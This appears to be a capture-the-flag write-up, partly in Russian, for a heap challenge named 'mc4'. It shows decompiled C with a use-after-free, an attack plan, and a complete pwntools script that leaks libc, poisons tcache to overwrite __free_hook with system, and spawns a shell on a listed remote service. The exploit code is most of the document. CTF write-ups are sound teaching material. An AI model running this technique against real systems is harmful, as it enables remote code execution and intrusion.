[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn9_mc4)
Hi! Adding tcache!
`nc 109.233.56.90 11803`
**[mc4.elf](https://pwn.spbctf.ru/files/bins/mc4/mc4.elf)**  
**[libc.so](https://pwn.spbctf.ru/files/bins/mc4/libc.so)**

``` C
void __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, nullptr, 2, 0);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stderr, nullptr, 2, 0);
  logic();
}

void logic()
{
  int choice; // [rsp+0h] [rbp-28h] BYREF
  unsigned int index; // [rsp+4h] [rbp-24h] BYREF
  unsigned __int64 canaty; // [rsp+8h] [rbp-20h]

  canaty = __readfsqword(0x28u);
  while ( 1 )
  {
    puts("Choose:\n\t1 - allocate mem print and free\n\t2 - print name\n\t3 - delete\n\t4 - edit");
    choice = 3;
    alarm(0x78u);
    if ( __isoc99_scanf("%d", &choice) != 1 )
      break;
    getc(stdin);
    switch ( choice )
    {
      case 1:                                   // алоцировать
        allocate();
        break;
      case 2:                                   // напечатать
        puts("Index?");
        index = 800;
        __isoc99_scanf("%d", &index);
        getc(stdin);
        if ( index > 9 )
          goto LABEL_11;
        puts(array[index]);
        break;
      case 3:                                   // удалить
        puts("Index?");
        index = 800;
        __isoc99_scanf("%d", &index);
        getc(stdin);
        if ( index > 9 )
LABEL_11:
          puts("...");
        else
          free(array[index]);
        break;
      case 4:                                   // редактировать
        edit();
        break;
      default:
        puts("What?");
        return;
    }
  }
}
```

План атаки:
1. Аллоцировать большой чанк, который при `free` попадёт в `unsorted bin`;
2. Ликнуть адрес libc из освобождённого чанка;
3. Подменить `__free_hook` на `system`;
4. Вызвать `free(&'/bin/sh')`.

Эксплоит:
``` python
def read_menu(io):
    io.recvuntil(b'4 - ')
    io.readline()

def alloc(io, size, data):
    read_menu(io)
    io.sendline(b'1')
    io.sendline(str(size).encode())
    io.sendline(data)

def print_chunk(io, index):
    read_menu(io)
    io.sendline((f'2 {index}').encode())
    io.recvline()
    data = io.recvline()[:-1]
    return data

def delete(io, index):
    read_menu(io)
    io.sendline((f'3 {index}').encode())

def edit(io, index, data):
    read_menu(io)
    io.sendline(b'4')
    io.sendline(str(index).encode())
    io.sendline(data)

main_arena_offset = 0x1ebb80
unsorted_bin_offset = main_arena_offset + 0x60
__free_hook_offset = libc.sym['__free_hook']
system_offset = 0x55410

io = start()

# Leak libc
alloc(io, 2000, b'1')
alloc(io, 80, b'2')
delete(io, 0)

leak = print_chunk(io, 0)
leak = u64(leak.ljust(8, b'\x00'))
libc_base = leak - unsorted_bin_offset
print('[+] Leak libc: ', hex(libc_base))

__free_hook = libc_base + __free_hook_offset
print('[+] __free_hook: ', hex(__free_hook))
system = libc_base + system_offset
print('[+] system: ', hex(system))

# Подмена __free_hook
alloc(io, 20, b'3')
alloc(io, 20, b'4')
delete(io, 2)
delete(io, 3)
payload = p64(__free_hook)
edit(io, 3, payload)
alloc(io, 20, b'a')
payload = p64(system)
alloc(io, 20, payload)

# RCE
alloc(io, 100, b'/bin/sh')
delete(io, 6)

io.interactive()
```

Запуск:
![](../../../../z.%20Images/{97995A5F-9F1C-4A77-B3F2-8C62B8C37958}.png)